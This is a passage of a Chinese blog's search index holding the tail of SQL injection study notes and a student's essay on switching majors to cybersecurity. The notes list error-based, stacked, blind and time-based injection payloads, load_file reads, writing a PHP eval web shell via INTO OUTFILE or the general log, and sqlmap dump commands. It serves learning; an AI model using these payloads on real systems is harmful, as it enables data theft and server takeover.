class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database())),<span class="number">1</span>)) </span><br></pre></td></tr></table></figure><h3 id="常见可利用函数"><a href="#常见可利用函数" class="headerlink" title="常见可利用函数"></a>常见可利用函数</h3><ul><li>updatexml()：是mysql对xml文档数据进行查询和修改的xpath函数</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(<span class="number">0x3a</span>,concat(<span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>extractvalue()：是mysql对xml文档数据进行查询的xpath函数</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())))</span><br></pre></td></tr></table></figure><ul><li>floor()：mysql中用来取整的函数</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span></span><br><span class="line">information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a</span><br></pre></td></tr></table></figure><ul><li>exp()：此函数返回e(自然对数的底)指数X的幂值</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</span><br></pre></td></tr></table></figure><ul><li>ST_LatFromGeoHash()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ST_LatFromGeoHash((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure><ul><li>GTID_SUBSET()</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GTID_SUBSET(version(), <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="利用方式举例-1"><a href="#利用方式举例-1" class="headerlink" title="利用方式举例"></a>利用方式举例</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;语句<span class="number">1</span>;语句<span class="number">2</span>;语句<span class="number">3</span>;……</span><br></pre></td></tr></table></figure><h3 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> users</span><br><span class="line"><span class="keyword">show</span> databases</span><br><span class="line"><span class="keyword">show</span> tables</span><br><span class="line"><span class="keyword">show</span> columns</span><br></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="利用方式举例-2"><a href="#利用方式举例-2" class="headerlink" title="利用方式举例"></a>利用方式举例</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(<span class="built_in">substring</span>(database(),<span class="number">1</span>))<span class="operator">=</span>ascii(<span class="string">&#x27;s&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="利用方式举例-3"><a href="#利用方式举例-3" class="headerlink" title="利用方式举例"></a>利用方式举例</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(<span class="built_in">substring</span>(database(),<span class="number">1</span>))<span class="operator">=</span>ascii(<span class="string">&#x27;s&#x27;</span>) <span class="keyword">and</span> sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h1 id="SQL文件读写"><a href="#SQL文件读写" class="headerlink" title="SQL文件读写"></a>SQL文件读写</h1><h2 id="使用前提"><a href="#使用前提" class="headerlink" title="使用前提"></a>使用前提</h2><ul><li><p>root权限</p></li><li><p>绝对路径</p></li><li><p>secure_file_priv允许</p></li></ul><h2 id="任意文件读"><a href="#任意文件读" class="headerlink" title="任意文件读"></a>任意文件读</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> load_file(&quot;绝对路径&quot;)</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> load_file(&quot;/var/www/html/secret.php&quot;)</span><br></pre></td></tr></table></figure><h2 id="任意文件写"><a href="#任意文件写" class="headerlink" title="任意文件写"></a>任意文件写</h2><h3 id="基于into"><a href="#基于into" class="headerlink" title="基于into"></a>基于into</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> &quot;&lt;?php @eval($_POST[aaa];?)&quot; <span class="keyword">into</span> outfile &quot;绝对路径&quot; # 会在末端写入新行以及转义换行符，可能会破坏二进制文件</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> &quot;&lt;?php @eval($_POST[aaa];?)&quot; <span class="keyword">into</span> dumpfile &quot;绝对路径&quot;</span><br></pre></td></tr></table></figure><h3 id="基于log（用于堆叠注入）"><a href="#基于log（用于堆叠注入）" class="headerlink" title="基于log（用于堆叠注入）"></a>基于log（用于堆叠注入）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/path/to/file&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php var_dump(&quot;test&quot;);?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/original/path&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> off;</span><br></pre></td></tr></table></figure><h1 id="sqlmap的基础使用流程"><a href="#sqlmap的基础使用流程" class="headerlink" title="sqlmap的基础使用流程"></a>sqlmap的基础使用流程</h1><h2 id="GET型注入"><a href="#GET型注入" class="headerlink" title="GET型注入"></a>GET型注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 网址 --dbs<span class="comment"># 爆库名</span></span><br><span class="line">sqlmap -u 网址 -D 库名 --tables<span class="comment">#爆表名</span></span><br><span class="line">sqlmap -u 网址 -D 库名 -T 表名 --columns<span class="comment"># 爆列名</span></span><br><span class="line">sqlmap -u 网址 -D 库名 -T 表名 -C 列名 --dump<span class="comment"># 获取数据</span></span><br></pre></td></tr></table></figure><h2 id="POST型注入"><a href="#POST型注入" class="headerlink" title="POST型注入"></a>POST型注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u 网址 --forms<span class="comment"># 自动检测注入表单</span></span><br><span class="line">sqlmap -u 网址 --forms --dbs<span class="comment"># 爆库名</span></span><br><span class="line">sqlmap -u 网址 --forms -D 库名 --tables<span class="comment">#爆表名</span></span><br><span class="line">sqlmap -u 网址 --forms -D 库名 -T 表名 --columns<span class="comment"># 爆列名</span></span><br><span class="line">sqlmap -u 网址 --forms -D 库名 -T 表名 -C 列名 --dump<span class="comment"># 获取数据</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web-基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> fuzz </tag>
            
            <tag> 绕过 </tag>
            
            <tag> sqlmap </tag>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客设立</title>
      <link href="/2021/07/27/%E5%8D%9A%E5%AE%A2%E8%AE%BE%E7%AB%8B/"/>
      <url>/2021/07/27/%E5%8D%9A%E5%AE%A2%E8%AE%BE%E7%AB%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="前期总结"><a href="#前期总结" class="headerlink" title="前期总结"></a>前期总结</h2><ul><li><p>作为一个有幸从化工专业转到网络安全专业进行学习的一个SCUer，我还是挺高兴能够从被调剂的专业进入一个自己真正想要学习的专业。</p><p>2018年的高考题型变化、诸多大学缩招导致不确定因素很多，当时为了求稳我选择填报SCU的计算机专业，却不曾想位次变化那么大，加之当年SCU的<strong>“3-1-1-1”魔鬼极差</strong>，导致我被调剂到化工专业。收到录取通知的一时间也算是百感交集，随后也就着手准备转专业。</p><p>SCU对于转专业也算是放得很开了，方式也很繁多：</p><ol><li>新生入学考入吴玉章学院可获得免试直接转入绝大多数学院的‘特权’</li><li>各种拔尖班、基地班无论录取专业，只要考核通过即可转入学习</li><li>大一、大二共两次申请转专业的机会通过对方学院考核后即可转入学习</li></ol><p>由于计算机拔尖班和吴玉章学院的考核时间冲突，犹豫再三的我最终选择去尝试吴玉章学院，然而在第一轮笔试中差了2分被淘汰，不能进入第二轮的面试</p><p>于是在原化工专业的学习过程中我开始着手准备一学期后的转专业考试，在此过程中认识了很多同为化工、轻纺等专业的志同道合（想转专业）的朋友，和他们一起探讨和准备，又在网安专业一些学长的耐心指导下学习了很多相关知识</p><p>转专业考核的难度有所升级，笔试题我完成得并不是很好，但由于积累了较多相关知识，在经过面试后有惊无险地和绝大多数也想转入网安专业的朋友一起溜之大吉</p></li><li><p>转专业之前的一个学年在痛苦的化学中遨游，又得注意原专业的绩点必须达到转专业的表筛最低标准，又得一边学习想去专业的专业知识，也算是比较辛苦，结束了这一阶段之后，我降级来到新的专业，开始了网安专业的“初体验”</p></li><li><p>我自认为我的课业成绩一直算不上太好（尤其是数学），于是在转入网安之后也没对保研抱什么太大的希望，尤其是新专业要学的数学课程更多……已经学了一年微积分（Ⅱ）的我依然难以对敌新专业更高要求的微积分（Ⅰ），但是我发现我在网安专业课程上的学习和理解还不错，以至于我好像除了微积分和线性代数的成绩不太理想以外，思政课、专业课等取得的成绩还算不错。<strong>这个时候的想法开始有些许转变</strong></p></li><li><p>网安的课程相对而言比原专业化工更能提起我的兴趣，另一方面是我逐渐发现除了数学相关的课程以外，我在诸如专业课、思政课上取得的成绩都还不错，于是我开始有了准备尝试能否逐渐拉高自己的必修课成绩，我的考虑如下：</p><ol><li>必修课程在某种程度上也算是专业基础，能够学好也算是让自己的基础变得更扎实，便于之后的专业学习</li><li>必修课成绩若能一直稳步提升，也许能够使我跻身保研的行列</li><li>对于出国这条路，我比较佛系，可能留在国内的意愿会更加强烈，所以选修课成绩于我而言不是很重要</li><li><strong>要么保研，要么本科直接出去工作</strong>的想法逐渐产生</li></ol></li><li><p>于是新专业的大一、大二学年我的学习重心放在了课程学习上，专业技术的学习比较松懈。我认识的很多朋友逐渐在专业领域取得比较出彩的成绩，而我在专业领域上近乎没有太大的发展。有的时候会有些心急，但是我还是没有动摇学习专业课的学习重心，寄希望于 **扎实基础，厚积薄发 ** </p></li></ul><h2 id="后期计划"><a href="#后期计划" class="headerlink" title="后期计划"></a>后期计划</h2><ul><li><p>网安专业的必修课程主要集中在前两个学年，而这两个学年在我写下这篇文章的时候已经告一段落了。在这两个学年中我得到的几乎只有<strong>“书本上的死知识”</strong>，现在是时候开始动手实践了</p></li><li><p>之后的实践要基于以下几个条件：</p><ol><li>课程所学知识</li><li>对于二进制安全浅尝辄止的学习</li><li>对于Web安全更加强烈的兴趣</li></ol></li><li><p>准备在暑期开始逐步归纳总结前两年中断断续续学到的专业技术和知识，加以复习并逐步归纳到这个博客中，尤其是因为习惯手写而在ipad上记录的部分学习笔记</p></li><li><p>在学习Web安全常见的一些方面之后重点进行渗透方向和漏洞挖掘方向的学习</p></li><li><p>在下学期开始联系老师进入实验室进行‘科研初体验’，以确定自己究竟应该读研还是更喜欢直接工作这个选择</p></li><li><p>开始追逐身边技术大佬的脚步，开始投身于一些相关竞赛</p></li></ul><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">也许前两年有借口暂时逃避专业技术的学习，但自此已经失去了逃避的借口。</span><br><span class="line">  </span><br><span class="line">我想看看在接下来的一年中我能做到什么程度，我很好奇。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
